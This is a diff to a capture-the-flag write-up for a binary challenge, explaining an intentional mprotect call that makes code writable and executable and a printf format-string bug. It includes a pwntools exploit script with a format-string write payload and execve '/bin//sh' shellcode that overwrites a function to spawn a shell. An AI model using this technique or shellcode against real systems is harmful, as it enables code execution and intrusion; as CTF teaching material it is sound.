@@ -18,7 +18,13 @@ is the one used to calculate the offset of the buffer in the stack, (I knew this
 ![](./chall.png)
 
 # Vulnerabilities
-If we check the code, we notice that there is a format-string vulnerbility in the print_name function
+First of all, we got this "gift" in the main function:
+```c
+mprotect((void*)(((unsigned long)&func >> 12) << 12),0x1000,PROT_READ | PROT_WRITE | PROT_EXEC); //This is a gift for you
+```
+In memory, for security purposes, there is no segment when the process has both write and execute permissions<br>
+and here, this line is making the code segment both writeable and executable, so we can overwrite the code of any function from the binary with our shellcode<br><br>
+And if to do that there is a format-string vulnerbility in the print_name function
 ```c
 void print_name(char name[NAME_SIZE]){
     printf(name); // format string :)
@@ -42,7 +48,7 @@ from pwn import *
 exe = ELF("./chall")
 context.binary = exe
 
-shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
+shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
 
 def conn():
     return remote("write-what-where.ctf.shellmates.club", 443, ssl=True)
@@ -68,25 +74,32 @@ def main():
 
         # forming the format-string payload
         left = (menu_addr >> 32) - 12 #12 'a' at the start of the payload
+        log.info(f"First 2 most significant bytes to overwrite :: {hex(left)}")
         right = (menu_addr & 0xffffffff) - left #offset of aaaaaa and already written bytes
+        log.info(f"last 4 least significant bytes to overwrite :: {hex(right)}")
 
-        s = f'aaaaaaaaaaaa%{str(left)}c%19$n%{str(right)}c%20$n'
-        if len(s) != 40:
-            log.info(f"bad payload length :: {len(s)}")
-            print(s)
+        payload = f'aaaaaaaaaaaa%{str(left)}c%19$n%{str(right)}c%20$n'
+        log.info(f"Format-string payload :: {payload}")
+        if len(payload) != 40: # check to make sure for address are aligned in memory
+            log.info(f"Bad payload length :: {len(payload)}. Retrying ...\n")
+            print(payload)
             r.close()
             continue
 
         # overwriting the RBP pointer with a menu function pointer (minus some offset)
-        r.sendline(flat(b'aaaaaaaaaaaa%', str(left), b'c%19$n%', str(right), b'c%20$n', p64(rbp_addr+4), p64(rbp_addr)))
+        log.info(f"Sending format-string payload, please wait ...")
+        r.sendline(flat(b'aaaaaaaaaaaa%', bytes(str(left), 'utf-8'), b'c%19$n%', bytes(str(right), 'utf-8'), b'c%20$n', p64(rbp_addr+4), p64(rbp_addr)))
         r.recvuntil(b'Choice:')
         r.sendline(b'2')
 
         # Overwriting menu function code with shellcode using get_name option
         r.recvuntil(b'Choice:')
+        log.info(f"Overwriting menu function code with shellcode, here is your shell ;)\n")
         r.sendline(b'1')
         r.sendline(flat(shellcode))
+        r.recvuntil(b'Name:')
         r.interactive()
+        break
 
 
 if __name__ == "__main__":
